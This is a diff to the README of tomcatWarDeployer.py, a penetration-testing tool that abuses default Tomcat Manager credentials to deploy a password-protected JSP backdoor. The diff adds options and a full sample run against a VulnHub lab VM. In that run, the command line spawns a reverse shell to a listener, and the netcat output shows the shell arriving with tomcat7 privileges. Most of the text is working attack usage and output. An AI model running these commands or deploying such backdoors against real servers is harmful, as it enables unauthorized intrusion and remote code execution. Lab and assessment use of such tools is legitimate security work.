@@ -24,6 +24,9 @@ Usage: tomcatWarDeployer.py [options] server
 
 Options:
   -h, --help            show this help message and exit
+  -R APPNAME, --remove=APPNAME
+                        Remove deployed app with specified name. Can be used
+                        for post-assessment cleaning
   -X PASSWORD, --shellpass=PASSWORD
                         Specifies authentication password for uploaded shell,
                         to prevent unauthenticated usage. Default: randomly
@@ -36,6 +39,10 @@ Options:
                         Specifies JSP application name. Default: "jsp_app"
   -x, --unload          Unload existing JSP Application with the same name.
                         Default: no.
+  -C, --noconnect       Do not connect to the spawned shell immediately. By
+                        default this program will connect to the spawned
+                        shell, specifying this option let's you use other
+                        handlers like Metasploit, NetCat and so on.
   -f WARFILE, --file=WARFILE
                         Custom WAR file to deploy. By default the script will
                         generate own WAR file on-the-fly.
@@ -53,29 +60,31 @@ Options:
 And sample usage on [Kevgir 1 VM by canyoupwn.me](https://www.vulnhub.com/entry/kevgir-1,137/) running at 192.168.56.100:8080 :
 
 ```
-user$ python tomcatWarDeployer.py -n back -v 192.168.56.100:8080
+user$ python tomcatWarDeployer.py -C -x -v -H 192.168.56.101 -p 4545 -n shell 192.168.56.100:8080
 
     Apache Tomcat auto WAR deployment & launching tool
     Mariusz B. / MGeeky '16
 
 Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
     
+INFO: Reverse shell will connect to: 192.168.56.101:4545.
 DEBUG: Browsing to "http://192.168.56.100:8080/manager/"... Creds: tomcat:tomcat
 DEBUG: Apache Tomcat Manager Application reached & validated.
 DEBUG: Generating JSP WAR backdoor code...
-DEBUG: Generating temporary structure for back WAR at: "/tmp/tmpr5cLZE"
+DEBUG: Preparing additional code for Reverse TCP shell
+DEBUG: Generating temporary structure for shell WAR at: "/tmp/tmpzndaGR"
 DEBUG: Working with Java at version: 1.8.0_60
 DEBUG: Generating web.xml with servlet-name: "JSP Application"
-DEBUG: Generating WAR file at: "/tmp/back.war"
+DEBUG: Generating WAR file at: "/tmp/shell.war"
 DEBUG: added manifest
 adding: files/(in = 0) (out= 0)(stored 0%)
 adding: files/WEB-INF/(in = 0) (out= 0)(stored 0%)
-adding: files/WEB-INF/web.xml(in = 538) (out= 255)(deflated 52%)
+adding: files/WEB-INF/web.xml(in = 541) (out= 254)(deflated 53%)
 adding: files/META-INF/(in = 0) (out= 0)(stored 0%)
 adding: files/META-INF/MANIFEST.MF(in = 68) (out= 67)(deflated 1%)
-adding: index.jsp(in = 2807) (out= 1081)(deflated 61%)
+adding: index.jsp(in = 4684) (out= 1597)(deflated 65%)
 DEBUG: WAR file structure:
-DEBUG: /tmp/tmpr5cLZE
+DEBUG: /tmp/tmpzndaGR
 ├── files
 │   ├── META-INF
 │   │   └── MANIFEST.MF
@@ -84,25 +93,45 @@ DEBUG: /tmp/tmpr5cLZE
 └── index.jsp
 
 3 directories, 3 files
-DEBUG: It looks that the application with specified name "back" has not been deployed yet.
-DEBUG: Deploying application: back from file: "/tmp/back.war"
+WARNING: Application with name: "shell" is already deployed.
+DEBUG: Unloading existing one...
+DEBUG: Unloading application: "http://192.168.56.100:8080/shell/"
+DEBUG: Succeeded.
+DEBUG: Deploying application: shell from file: "/tmp/shell.war"
+DEBUG: Removing temporary WAR directory: "/tmp/tmpzndaGR"
 DEBUG: Succeeded, invoking it...
-DEBUG: Invoking application at url: "http://192.168.56.100:8080/back/"
-INFO: JSP Backdoor up & running on http://192.168.56.100:8080/back/
-INFO: Happy pwning, here take that password: 'unvQinPLUDiR'
-DEBUG: Removing temporary WAR directory: "/tmp/tmpr5cLZE"
+DEBUG: Invoking application at url: "http://192.168.56.100:8080/shell/"
+DEBUG: Adding 'X-Pass: b8vYQ9EU7suV' header for shell functionality authentication.
+WARNING: Set up your incoming shell listener, I'm giving you 3 seconds.
+INFO: JSP Backdoor up & running on http://192.168.56.100:8080/shell/
+INFO: Happy pwning, here take that password for web shell: 'b8vYQ9EU7suV'
 ```
 
-Which will result in the following JSP application accessible remotely:
+Which will result in the following JSP application accessible remotely via WEB:
 ![JSP backdoor gui](screen1.png)
 
 As one can see, there is password needed for leveraging deployed backdoor, preventing thus unauthenticated access during conducted assessment.
+
+Also, this particular example **performs reverse shell popping** by connecting here to the *192.168.56.101:4545*. 
+There one can observe:
+
+```
+user $ nc -klvp 4545
+listening on [any] 4545 ...
+192.168.56.100: inverse host lookup failed: Unknown host
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.100] 44423
+id
+uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
+```
+
+Summing up, user has spawned WEB application providing WEB backdoor, authenticated via POST 'password' parameter that can be specified by user or randomly generated by the program. Then, the application upon receiving *X-Pass* header in the invocation phase, spawned reverse connection to our *netcat* handler. The HTTP header is being requested here in order to prevent user refreshing WEB gui and keep trying to bind or reverse connect. Also this makes use of authentication to reach that code.
 
 That would be all I guess. 
 
 ### TODO
 
-* Implement bind & reverse tcp payload functionality as well as some pty to interact with it
+* ~~Implement bind & reverse tcp payload functionality~~ as well as some pty to interact with it
+* Finish implementing noconnect and connect functionality
 * Test it on tomcat8
 
 
